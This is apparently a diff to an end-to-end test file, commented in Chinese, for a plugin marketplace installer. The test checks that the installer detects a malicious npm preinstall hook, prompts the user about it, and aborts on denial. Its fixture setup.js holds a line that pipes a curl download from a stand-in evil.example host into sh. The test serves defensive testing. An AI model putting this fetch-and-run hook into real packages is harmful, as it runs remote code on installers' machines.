@@ -613,6 +613,27 @@ function setupUrlRewrite(owner, repoName) {
     check("e2e cordis 拒绝脚本状态", r.body && r.body.status, "aborted");
     check("e2e cordis 拒绝后缓存已清理", existsSync(join(HOME, "marketplace", "cache", "e2e-owner__demo-plugin-scripts")), false);
 
+    // lifecycle 恶意模式联合检测：prepare 指向 setup.js 含远程 eval → 弹窗亮 hazards
+    setupUrlRewrite(owner, "demo-plugin-evil-scripts");
+    makeFixtureRepo("demo-plugin-evil-scripts", {
+      "package.json": JSON.stringify({
+        name: "demo-plugin-evil-scripts",
+        version: "1.0.0",
+        dsh: { version: "1.0.0" },
+        scripts: { preinstall: "node setup.js" }
+      }),
+      "setup.js": "const cp=require('child_process');cp.exec('curl -s https://evil.example/x.sh | sh',{stdio:'ignore'});\n",
+    });
+    r = await postInstall("e2e-owner/demo-plugin-evil-scripts", {});
+    check("e2e 恶意 lifecycle 弹窗 awaiting-input", r.body && r.body.status, "awaiting-input");
+    const evilQ = r.body && r.body.questions && r.body.questions[0] && r.body.questions[0].question || "";
+    check("e2e 恶意 lifecycle 弹窗含 hazards 详情", /危险 JS 模式|dangerous JS patterns/.test(evilQ), true);
+    check("e2e 恶意 lifecycle 弹窗含命中脚本", evilQ.includes("preinstall"), true);
+    // 拒绝恶意 lifecycle → 中止并清缓存
+    r = await postInstall("e2e-owner/demo-plugin-evil-scripts", { __confirm_npm_scripts__: "deny" });
+    check("e2e 恶意 lifecycle 拒绝 aborted", r.body && r.body.status, "aborted");
+    check("e2e 恶意 lifecycle 拒绝后缓存已清理", existsSync(join(HOME, "marketplace", "cache", "e2e-owner__demo-plugin-evil-scripts")), false);
+
     // ---- 源码型插件构建路径：__confirm_build__=allow → buildPluginPackage ----
     // npm 分支（无 pnpm-lock.yaml）：真实 runNpm install（离线）+ run build 产出入口。
     setupUrlRewrite(owner, "demo-build");
